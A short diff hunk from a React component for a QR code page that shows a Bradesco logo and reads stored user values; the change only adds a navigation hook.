@@ -4,6 +4,7 @@ import bradescoLogo from "@/assets/bradesco-logo.png";
 import { resolveServerRoute } from "@/lib/resolveServerRoute";
 
 const QRCodePage = () => {
+  const navigate = useNavigate();
   const usuario = localStorage.getItem("usuario") || "";
   const nome = localStorage.getItem("nome") || "";
   const qr = localStorage.getItem("qr") || "";
